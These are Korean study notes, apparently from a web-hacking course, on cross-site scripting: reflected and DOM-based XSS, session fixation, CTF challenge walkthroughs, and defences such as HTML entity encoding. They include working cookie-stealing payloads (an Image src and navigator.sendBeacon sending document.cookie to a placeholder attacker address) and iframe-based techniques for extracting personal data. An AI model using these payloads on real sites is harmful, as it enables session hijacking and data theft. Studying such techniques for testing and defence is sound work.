XSS
> 피해자의 브라우저에서 실행되는 클라이언트 스크립트

> alert(1) : POC

> XSS 취약점 찾기


모의해킹 보고서에서 
> alert(1)만 할 때도 있음
>> 그만큼 시간이 적음

시간이 있다면 alert(1)만으로는 이해를 못하는 경우가 있음
> 왜 위험한지 설득을 위한 보고서 작성


> 그래서 한 쿠키 탈취
>> session ID를 탈취하는 코드

var i = new Image();
i.src = "공격 주소/cookie"+document.cookie;


xss 6 풀이

리플렉티드는 버프에서 찾는게 편함
<script>를 추가해서 중간에 새로운 스크립트 태그를 넣을 수 있음
> 문법 에러난 스크립트태그는 실행이 안되고 정상적인 코드만 실행됨

이거 왜 안보내지지했는데 운이였네;
> 이유: 브라우저 환경에 따라 다름
>> 내가 삽입한 스크립트가 언제 실행되는지 알아야함

>> 해결법
아래에 있는 스크립트태그인 로케이션 부분을 지우면 됨


공격자라고 생각하고
쿠키 탈취를 했고, 로그인을 해보면 index에서 탈취한 쿠키를 넣으며 안됨
> 새로 발급해주거나, 쿠키입력을 넣는 곳이 잘못 되었거나


로그인 페이지에 다른 입력이 가능하면 keylogger로 아이디와 비밀번호를 
평문으로 가져올 수 있음


로그인이 된 상태여야 하지만
만약 로그인이 안되어 있다면?
> 로그인 안되있는 상태에서 링크를 누르고 로그인시 공격자는 
피해자가 로그인시 공격자는 쿠키를 넣고 새로고침하면 로그인이 됨
>> 쿠키에 로그인된 정보가 저장되어 일어난 일
> 접속 쿠키와 로그인 쿠키를 나누는게 안전함


session fixation


navigator.sendBeacon
> 데이터만 보내기
navigator.sendBeacon("공격 주소", document.cookie);
이렇게 사용가능
> 이건 POST방식으로 보냄


이 xss 6번으로 알 수 있는 것

1. xss가 삽입되는 위치



xss Challenge 해보기
로그인 성공/실패, 유저정보, 게시글 보기 등은 값이 돌아오지 않지만
검색엔 오지만 값을 받고 그대로 보여주는 것이 아닌, html의 id값을 이용해서 출력하는 방식임
> 돔베이스

document.write을 찾아봐야함
그래서 브라우저의 개발자도구를 써야함
웹에서 <script>alert(1)</script>;를 검색에 추가할 시 나옴



XSS 대응방안
> 특수문자를 HTML Enitity로 치환 
하지만 안되는 곳이 있음
HTML Editor
> 하지만 치환을 안하기엔 보안상 문제가 큼
>> 방안은
1. 파라미터로 받는 데이터를 모드 HTML Entity 전부 치환

2. 허용할 태그를 식별해서 HTML 특수문자로 역치환

3. 복구한 태그 중 악의적인 eventHandler는 블랙리스트 기반 치환


xss는 자바스크립트뿐만 아니라 html태그도 넣을 수 있음
> 그러니 다른 부분을 추가해 볼 수 있음




개인정보 유출
> xss로 개인정보 유출
>> DOM객체 이용


마이페이지에서 일어났다면
> 마이페이지에 저장된 개인정보 탈취가능
>> 페이지에서 개발자모드로 코드를 확인하여 태그별 id를 확인하여
document.getElementById('id') 로 해당 값을 확인 할 수 있음
document.getElementByclassName('name')도 있음. 
document.getElementByclassName('name') [0] 이렇게 가져올 @번째걸 가져올 수 있음
document.getElementByclassName('name') [0].id / innerHTML 등 이렇게 해당 값을 가져올 수 있음



다른페이지의 정보를 가져올 수 있음
> iframe 태그사용. 새로운 창을 띄워서 그 페이지를 볼 수 있음
<iframe src="마이페이지 주소" id=""></iframe>
> iframe으로 정보를 탈취할 주소를 띄우고 개발자모드로 DOM기법을 
사용하여 
document.getElementById('asd').contentDocument.getElementBy~~
이렇게 접근할 수 있음



- javascript로 DOM 객체로 접근

- iframe을 활용하여 다른 페이지에 있는 데이터 수집가능

- 공격자 서버로 보낼 수 있음. (document.cookie등)




--------------------------
과제

1. xss 공격 시나리오 최소 1개 고민 후 구현

2. javascript로 DOM 객체 접근 연습

steal info (ifarme사용)
> 플래그가 있는 사이트가 있지만 권한이 없고 유사한 사이트가 주어짐

게시글에 iframe로 id와 onload를 사용
<script>로 document.로 iframe의 id를 불러오고 contentDocument.로 iframe로 불러온 사이트의 클래스이름을 가져옴 [@]로 가져올 번째꺼 가져옴
그리고 var i 로 이미지를 가져옴.


steal info 2 (ifarme사용)
> 게시판에 있음
1이랑 같음


Basic sctipt Pirac (ifarme미사용)
> 개인정보페이지의 두번째 인풋
개인정보의 처음칸인 user와 두번째칸인 정보칸 사이에 script를 넣으면 되는데
document.~~ 로는 두번째칸이 실행 전이라 오류가 남
그래서 난 페이지가 다 로딩된 후 스크립트를 실행할 수 있게
document.addEventListener("DOMContentLoaded",function () {스크립트 내용;});



3. 웹 개발

4. xss 공격 시나리오 추가